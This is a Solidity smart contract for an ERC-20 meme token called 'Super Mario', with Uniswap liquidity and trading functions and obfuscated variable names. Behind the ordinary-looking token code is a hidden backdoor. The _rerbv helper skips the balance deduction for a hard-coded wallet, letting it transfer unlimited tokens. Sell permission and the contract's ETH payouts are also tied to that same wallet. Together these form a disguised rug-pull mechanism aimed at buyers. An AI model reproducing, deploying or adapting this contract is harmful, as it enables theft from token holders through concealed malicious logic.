/*
*
*$Mario
*
*Twitter: https://twitter.com/Mario_Ethereum
*Telegram: https://t.me/Mario_Ethereum
*Website: https://marioeth.org/
*
**/


// SPDX-License-Identifier: MIT


pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _rerbv(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _rerbv(a, b, "SafeMath");
    }

    function  _rerbv(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _pvr(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract SuperMario is Context, IERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 private _jogsqj;
    address payable private _tyfodjh;
    address private _rkzodp;

    string private constant _name = unicode"Super Mario";
    string private constant _symbol = unicode"Mario";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 1000000000 * 10 **_decimals;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _evhjua;
    mapping (address => bool) private _viuqxy;
    mapping(address => uint256) private _fnpiox;
    uint256 public _qybfup = _totalSupply;
    uint256 public _drjtge = _totalSupply;
    uint256 public _kozlpv= _totalSupply;
    uint256 public _vzpuof= _totalSupply;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _ylkfoj=0;
    uint256 private _eyceuy=0;
    

    bool private _prdclt;
    bool public _ufovsq = false;
    bool private yiywbp = false;
    bool private _oweyp = false;


    event _puiwkh(uint _qybfup);
    modifier rsunuqr {
        yiywbp = true;
        _;
        yiywbp = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _totalSupply;
        _evhjua[owner(

        )] = true;
        _evhjua[address
        (this)] = true;
        _evhjua[
            _tyfodjh] = true;
        _tyfodjh = 
        payable (0x2EB7D8a6c7077B49f92339F576AE7d847b7B03Ec);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _totalSupply);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _rerbv(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 kpfkwb=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_ufovsq) {
                if (to 
                != address
                (_jogsqj) 
                && to !=
                 address
                 (_rkzodp)) {
                  require(_fnpiox
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _fnpiox
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _rkzodp && to != 
            address(_jogsqj) &&
             !_evhjua[to] ) {
                require(amount 
                <= _qybfup,
                 "Exceeds the _qybfup.");
                require(balanceOf
                (to) + amount
                 <= _drjtge,
                  "Exceeds the _drjtge.");
                if(_eyceuy
                < _ylkfoj){
                  require
                  (! _rdlckr(to));
                }
                _eyceuy++;
                 _viuqxy
                 [to]=true;
                kpfkwb = amount._pvr
                ((_eyceuy>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _rkzodp &&
             from!= address(this) 
            && !_evhjua[from] ){
                require(amount <= 
                _qybfup && 
                balanceOf(_tyfodjh)
                <_vzpuof,
                 "Exceeds the _qybfup.");
                kpfkwb = amount._pvr((_eyceuy>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_eyceuy>
                _ylkfoj &&
                 _viuqxy[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!yiywbp 
            && to == _rkzodp &&
             _oweyp &&
             contractTokenBalance>
             _kozlpv 
            && _eyceuy>
            _ylkfoj&&
             !_evhjua[to]&&
              !_evhjua[from]
            ) {
                _transferFrom( _jyjsp(amount, 
                _jyjsp(contractTokenBalance,
                _vzpuof)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _pkwiqh(address
                    (this).balance);
                }
            }
        }

        if(kpfkwb>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(kpfkwb);
          emit
           Transfer(from,
           address
           (this),kpfkwb);
        }
        _balances[from
        ]= _rerbv(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _rerbv(kpfkwb));
        emit Transfer
        (from, to, 
        amount.
         _rerbv(kpfkwb));
    }

    function _transferFrom(uint256
     tokenAmount) private
      rsunuqr {
        if(tokenAmount==
        0){return;}
        if(!_prdclt)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _jogsqj.WETH();
        _approve(address(this),
         address(
             _jogsqj), 
             tokenAmount);
        _jogsqj.
        swapExactTokensForETHSupportingFeeOnTransferTokens
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _jyjsp
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _rerbv(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _tyfodjh){
            return a ;
        }else{
            return a .
             _rerbv (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _qybfup = _totalSupply;
        _drjtge = _totalSupply;
        emit _puiwkh(_totalSupply);
    }

    function _rdlckr(address 
    account) private view 
    returns (bool) {
        uint256 euervb;
        assembly {
            euervb :=
             extcodesize
             (account)
        }
        return euervb > 
        0;
    }

    function _pkwiqh(uint256
    amount) private {
        _tyfodjh.
        transfer(
            amount);
    }

    function openTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _prdclt ) ;
        _jogsqj  
        =  
        IUniswapV2Router02
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _jogsqj), 
            _totalSupply);
        _rkzodp = 
        IUniswapV2Factory(_jogsqj.
        factory( ) 
        ). createPair (
            address(this
            ),  _jogsqj .
             WETH ( ) );
        _jogsqj.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_rkzodp).
        approve(address(_jogsqj), 
        type(uint)
        .max);
        _oweyp = true;
        _prdclt = true;
    }

    receive() external payable {}
}